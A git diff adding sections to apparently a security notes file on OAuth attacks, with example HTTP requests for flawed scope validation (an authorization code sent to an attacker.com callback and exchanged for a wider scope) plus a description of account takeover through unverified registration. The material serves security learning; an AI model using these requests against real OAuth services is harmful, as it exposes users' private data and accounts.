@@ -61,7 +61,9 @@ Check this for more details : [Portswigger Lab](https://portswigger.net/web-secu
 
 ### Stealing OAuth access tokens via a proxy page
 
-[Portswigger Lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
+More deatils: [Portswigger Lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
+
+---
 
 ### Exploiting response_mode and redirect_uri
 
@@ -76,4 +78,54 @@ client_id=12345
 ```
 
 ---
+
+### Exploiting flawed scope validation in authorization code grant type in Oauth service provider server
+
+**Note: For this we need our own malicious application**
+
+In some scenario we can leak user information from Oauth authorization server by exploiting a misconfigured `scope` parameter during server-to-server token exchange.<br>
+<br>
+**Initial Authorization Request**
+```
+GET /authorize?client_id=12345
+&redirect_uri=https://attacker.com/callback
+&response_type=code
+&scope=openid email
+&state=xyz123
+HTTP/1.1
+Host: oauth-authorization-server.com
+```
+Now, the attacker exchanges the authorization code for an access token but modifies the `scope` parameter to include `profile`.<br>
+<br>
+**Authorization Code Exchange**
+```
+POST /token HTTP/1.1
+Host: oauth-authorization-server.com
+Content-Type: application/x-www-form-urlencoded
+
+client_id=12345
+&client_secret=SECRET
+&redirect_uri=https://attacker.com/callback
+&grant_type=authorization_code
+&code=abc123xyz
+&scope=openid email profile
+```
+In vulnerable case, the server does not reject the request and issues an access token with elevated privileges. Now the attacker has an access token with unauthorized profile access and can retrieve sensitive user data via API calls.<br>
+<br>
+**API call**
+```
+GET /userinfo HTTP/1.1
+Host: api.oauth-authorization-server.com
+Authorization: Bearer z0y9x8w7v6u5
+```
+***Note: `z0y9x8w7v6u5` is the access token.*** <br>
+<br>We can do this in implicit grant type also by stealing the access token.<br>
+<br>
+More details: [Portswigger](https://portswigger.net/web-security/oauth#flawed-scope-validation)
+
+---
+
+### Unverified user registration
+
+Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider.
 
